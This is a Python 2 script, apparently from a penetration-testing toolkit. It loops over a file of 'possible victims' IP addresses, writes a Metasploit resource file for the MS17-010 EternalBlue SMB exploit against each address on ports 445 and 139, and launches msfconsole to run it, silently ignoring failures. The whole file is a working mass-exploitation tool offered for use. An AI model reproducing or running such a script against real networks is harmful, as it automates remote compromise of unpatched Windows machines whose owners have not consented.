import os
import sys
import socket
from termcolor import colored
import StringIO
import time

wordlist = '/root/Documents/eternal_blue_possible_victims.txt'
resource_file = '/root/Documents/eternal_blue_tmp_file_rwx.rc'

r = open(wordlist,'r')
with open(wordlist,'r') as r:
    line = r.readline().strip()
    sentence = str(line)
    # port_open = 4444
    for sentence in r:
            try:
                print colored('Targeting %s','yellow',attrs=['bold']) % sentence
                print colored('Generating temporary resource file','green',attrs=['bold'])
                w = open(resource_file,'w')
                w.write('use exploit/windows/smb/ms17_010_eternalblue\n')
                # w.write('set LPORT 443\n')
                # w.write('set LPORT %s\n') % port_open
                # port_open += port_open
                w.write('set LHOST 0.0.0.0\n')
                w.write('set RPORT 445\n')
                target_string = 'set RHOST %s\n' % sentence
                w.write(target_string)
                w.write('exploit\n')
                w.write('set RPORT 139\n')
                w.write('rexploit\n')
                w.write('exit\n')
                w.close()
                print colored('Running temporary resource file','green',attrs=['bold'])
                execute_string = 'msfconsole -r %s' % resource_file
    # os.system("gnome-terminal -e 'bash -c \"python /root/ArmsCommander/networkdefenses/proxychainsTest.py; exec bash\"'")
                # execute_string = "gnome-terminal -e 'bash -c \"msfconsole -r %s; exec bash\"'" % resource_file
                # os.system("gnome-terminal -e 'bash -c \"msfconsole -r %s'")
                os.system(execute_string)
            except:
                pass
